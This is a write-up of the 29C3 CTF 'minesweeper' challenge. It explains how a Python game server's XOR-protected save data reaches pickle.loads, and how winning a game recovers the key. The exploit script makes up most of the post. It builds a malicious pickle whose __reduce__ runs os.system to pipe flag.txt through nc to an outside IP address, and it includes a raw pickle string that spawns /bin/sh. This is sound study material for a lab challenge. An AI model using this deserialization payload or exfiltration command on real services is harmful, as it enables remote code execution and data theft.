---
title: 29C3 CTF Exploitation 100 minesweeper
author: kelwin
layout: post
permalink: /29c3-ctf-minesweeper/
categories:
  - CTF
  - writeup
---
There&#8217;s a python remote service in this challenge, which runs a classical windows game &#8220;minesweeper&#8221;. You can send command to play the game and get game status from remote server. What&#8217;s interesting in the challenge is the load and save mechanism. If you choose to send &#8220;save&#8221; command, you will get a string which you can use it to restore the game. However, it uses a Python module &#8220;Pickle&#8221; to save and load the game status object. &#8220;Pickle&#8221; module has vulnerablity which you can exploit it to execute arbitrarily command. Vulnerable code is as below:

    def load(self, data):
        self.__dict__ = pickle.loads(data)
    
    def save(self):
        return pickle.dumps(self.__dict__, 1)
    

However, to construnct malformed data for the server to load is not that easy. It uses a remote side key to encode the game status data after &#8220;save&#8221; function and decode it before &#8220;load&#8221;. So in order to construct what we want to pass to &#8220;load&#8221; correctly, we should first figure the encryption key out. It&#8217;s an easy xor algorithm. We can win a game manully and use the mines&#8217; position information to construct the encoding process locally. With the help of returned &#8220;save&#8221; string for restore, we can recover the remote key. Using the key, we can construnt anything evil to capture the flag.

Code sample for exploitation is below:

    #You win
    #  0123456789012345
    # +----------------+
    #0|0001!22110000000|0
    #1|00012!2 10000000|1
    #2|0000112110000000|2
    #3|1110000111000000|3
    #4|1 100001 1001221|4
    #5|2210000111001  1|5
    #6| 100001110001221|6
    #7|1100001 10000000|7
    #8|0000001111110000|8
    #9|0000000001 10000|9
    #0|0000001111110000|0
    #1|0111002 31001221|1
    #2|12 1002  2111  1|2
    #3| 211001222 11343|3
    #4|11000000011101  |4
    #5|0000000000000122|5
    # +----------------+
    f = Field(16, 16, 20)
    mines = [(0, 6), (0, 13), (1, 4), (2, 12), (4, 0), (5, 1), (7, 1), (7, 7), (7, 11), (7, 12), (8, 4), (8, 12), (10, 9), (10, 13), (13, 5), (13, 12), (14, 5), (14, 12), (14, 14), (15, 14)]
    f.set(mines)
    
    sg64 = "HPplCE7Muyvp1j5A14955hXLFCe9haqb75ao1xO90X7+Natm428OJ/lXrgXEB6us8h7+3SasoqCOcNN1erlRMqRgdk5vxDDasf1GoAK1px95fLRcaXQzvQ9yNeGxSnjsfLljG4OyP7ETeRsEdYfOAemHJNmFf/PWjED9YVVCXopwFN5thdVzetzod5VbdjM7oBwOf1hzCFCCp6HPPORonEEgTxAukve+Jl/LUxKgRAlNKoTPSCQVNae7T7ucp0d6xFfpqHpAcjGb+WxJoCfo+59uCIb4GZBM7JZEH3Z+8Bswnpr5ZbfF/9PZ+CEcTPI/p444N0bX9r3lIg=="
    sg = base64.standard_b64decode(sg64)
    msg = f.save()
    print f.__dict__
    
    h = hashlib.sha1()
    h.update(msg)
    msg = "4n71cH3aT" + h.digest() + msg
    key = ""
    print len(msg),len(sg)
    
    for i in xrange(0, len(msg)):
        key += chr(ord(msg[i]) ^ ord(sg[i]))
    print key
    
    class Exploit(object):
      def __reduce__(self):
          comm = "cat flag.txt | nc 166.111.132.184 5678"
          return (os.system, (comm,))
    
    msg = "cos\nsystem\n(S'/bin/sh'\ntR.'\ntR."
    msg = pickle.dumps(Exploit())
    h = hashlib.sha1()
    h.update(msg)
    msg = "4n71cH3aT" + h.digest() + msg
    tmp = ""
    
    for i in xrange(0, len(msg)):
        tmp += chr(ord(msg[i]) ^ ord(key[i]))
    msg = tmp
    
    print "Your savegame: " + base64.standard_b64encode(msg)
    print ""
    print ""
    
    tmp = ""
    for i in xrange(0, len(msg)):
        tmp += chr(ord(msg[i]) ^ ord(key[i]))
    msg = tmp
    if msg[0:9] != "4n71cH3aT":
        print (True, "Unable to load savegame (magic)")
    h = hashlib.sha1()
    h.update(msg[9+h.digest_size:])
    if msg[9:9+h.digest_size] != h.digest():
        print (True, "Unable to load savegame (checksum)")
    f.load(msg[9+h.digest_size:])